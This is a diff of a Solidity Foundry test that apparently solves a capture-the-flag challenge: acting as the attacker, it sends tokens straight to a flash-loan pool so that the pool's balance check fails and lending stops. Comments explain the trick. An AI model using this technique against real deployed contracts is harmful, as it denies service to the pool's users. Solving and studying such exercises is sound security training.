@@ -11,14 +11,12 @@ contract FlashPoolTest is FlashPoolFixture {
 
     function test_flashPool() public {
 
-        // Start acting as the attacker for the remainder of the exploit
         vm.startPrank(attacker);
-
-        token.transfer(address(pool), 1);
-
-        // Stop acting like the attacker
+        //In the flash loan function, a require to execute the loan is  assert(poolBalance == balanceBefore)
+        //So if we call this function after we transfer any quantity to the pool, this condition will stop the loan.
+        token.transfer(address(pool), 30);
+        //Poolbalance = 1030 != 1000 ether
         vm.stopPrank();
-        // Perform exploit validations
         _assertions();
     }
 
